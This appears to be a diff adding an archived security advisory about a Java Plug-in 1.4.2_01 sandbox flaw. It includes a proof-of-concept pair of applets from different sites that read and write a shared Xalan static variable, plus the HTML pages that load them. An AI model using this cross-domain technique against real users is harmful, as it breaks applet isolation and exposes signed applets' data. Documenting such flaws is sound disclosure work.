@@ -1,0 +1,80 @@
+source: http://www.securityfocus.com/bid/8857/info
+
+A vulnerability has been reported in Java implementations that may potentially allow Java applets from two different domains to violate the sandbox security model and share read/write access to data areas. This violates the principle of isolation that should be enforced by Java and it is possible for unsigned applets to gain unauthorized access to data used by signed applets.
+
+This issue was reported for Java Plug-in 1.4.2_01 on Microsoft Windows platforms, though it is believed that other platforms are similarly affected. It is not known if other versions or Java implementations are also affected.
+
+Two applets,
+- one on siteA: www.siteA.org => Read.html / ReadApplet.class
+- one on siteB: www.siteB.org => Write.html / WriteApplet.class
+
+Applet from siteB can share a variable also accessible (read and write)
+which is used by siteA. So data protection is not guaranteed, an unsigned
+applet may grab data stored in this variable by a signed applet
+or interfere it's XML processing and therefore violates the isolation
+restriction of the sandbox.
+
+==========READAPPLET=========================
+/* Illegalaccess.org java exploit */
+/* coded by Marc Schoenefeld */
+
+import java.awt.Graphics;
+
+public class ReadApplet extends java.applet.Applet {
+
+public void paint(Graphics g)
+{
+
+System.out.println(org.apache.xalan.processor.XSLProcessorVersion.S_VERSION);
+}
+
+static {
+
+System.out.println(org.apache.xalan.processor.XSLProcessorVersion.S_VERSION);
+}
+}
+==========READAPPLET=========================
+
+==========WRITEAPPLET=========================
+import java.awt.Graphics;
+
+
+public class WriteApplet extends java.applet.Applet {
+public void paint(Graphics g)
+{
+org.apache.xalan.processor.XSLProcessorVersion.S_VERSION += "a";
+}
+
+
+static {
+org.apache.xalan.processor.XSLProcessorVersion.S_VERSION = "altered
+from
+SiteA";
+}
+}
+==========WRITEAPPLET=========================
+
+
+=========Write.html============================
+<HTML>
+<BODY BGCOLOR=#66FF66>
+<PRE>
+WriteApplet, write to variable
+Marc (marc@org.illegalaccess)
+</PRE>
+<applet codebase=. code=WriteApplet.class width=100 height=100>
+</applet>
+</BODY>
+</HTML>
+
+========Read.html=============================
+<HTML>
+<BODY BGCOLOR=#6666FF>
+<PRE>
+ReadApplet, read from variable
+Marc (marc@org.illegalaccess)
+</PRE>
+<applet codebase=. code=ReadApplet.class width=100 height=100>
+</applet>
+</BODY>
+</HTML> 
